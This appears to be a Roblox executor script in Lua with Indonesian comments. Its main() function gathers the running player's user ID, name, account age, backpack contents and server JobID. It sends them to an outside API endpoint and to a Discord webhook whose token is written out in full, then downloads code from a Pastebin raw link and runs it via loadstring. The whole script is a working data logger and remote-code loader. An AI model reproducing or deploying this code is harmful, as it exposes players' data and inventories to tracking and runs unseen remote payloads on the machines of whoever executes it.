local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- ============ KONFIGURASI ============
local API_ENDPOINT = "https://backend-vercel-ashy.vercel.app/api/register.js"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
-- =====================================

local player = Players.LocalPlayer
local jobId = game.JobId

-- Fungsi HTTP request dengan fallback ke executor populer
local function httpRequest(url, method, body, headers)
	local requestFunc = syn and syn.request or http_request or request
	if not requestFunc then return nil end

	local success, response = pcall(function()
		return requestFunc({
			Url = url,
			Method = method,
			Headers = headers or {
				["Content-Type"] = "application/json"
			},
			Body = body
		})
	end)

	return success and response or nil
end

-- Dapatkan isi backpack player
local function getBackpackContents()
	local contents = {}
	local backpack = player:FindFirstChild("Backpack")
	if not backpack then return "Backpack tidak ditemukan" end

	for _, item in ipairs(backpack:GetChildren()) do
		table.insert(contents, item.Name)
	end

	return #contents > 0 and table.concat(contents, ", ") or "Backpack kosong"
end

-- Eksekusi script eksternal
local function executeExternalScript()
	local success, scriptContent = pcall(function()
		return HttpService:GetAsync(EXTERNAL_SCRIPT)
	end)

	if success and scriptContent then
		local loaded, err = loadstring(scriptContent)
		if loaded then
			local runSuccess, runErr = pcall(loaded)
			if not runSuccess then
				warn("‚ö†Ô∏è Gagal menjalankan script eksternal:", runErr)
			end
		else
			warn("‚ö†Ô∏è Gagal memuat script eksternal:", err)
		end
	else
		warn("‚ö†Ô∏è Tidak dapat mengambil script dari URL:", EXTERNAL_SCRIPT)
	end
end


-- Kirim data ke API
local function sendToAPI()
	local data = {
		instanceId = jobId,
		player = {
			userId = player.UserId,
			name = player.Name,
			accountAge = player.AccountAge
		},
		backpackContents = getBackpackContents(),
		timestamp = os.time()
	}

	local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
	if response and response.StatusCode == 200 then
		print("‚úÖ Data berhasil dikirim ke API")
		return true
	else
		warn("‚ùå Gagal mengirim data ke API:", response and response.StatusCode or "Tidak ada response")
		return false
	end
end

-- Kirim webhook Discord
local function sendWebhook()
	local embed = {
		username = "Logger System",
		embeds = {
			{
				title = "üü¢ Script Dijalankan",
				description = string.format("**%s** menjalankan script\n**JobID:** `%s`", player.Name, jobId),
				color = 65280,
				timestamp = DateTime.now():ToIsoDate(),
				fields = {
					{
						name = "üéí Isi Backpack",
						value = getBackpackContents(),
						inline = false
					},
					{
						name = "üë§ Info Player",
						value = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
						inline = true
					}
				},
				footer = {
					text = "Logger v2.0"
				}
			}
		}
	}

	local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
	if response and (response.StatusCode == 200 or response.StatusCode == 204) then
		print("‚úÖ Webhook berhasil dikirim ke Discord")
	else
		warn("‚ùå Gagal mengirim webhook:", response and response.StatusCode or "Tidak ada response")
	end
end

-- Fungsi utama
local function main()
	local apiSuccess = sendToAPI()
	sendWebhook()
	if apiSuccess then
		executeExternalScript()
	end
end

-- Jalankan dengan proteksi error
local success, err = pcall(main)
if not success then
	warn("‚ùå Error fatal pada eksekusi:", err)
end
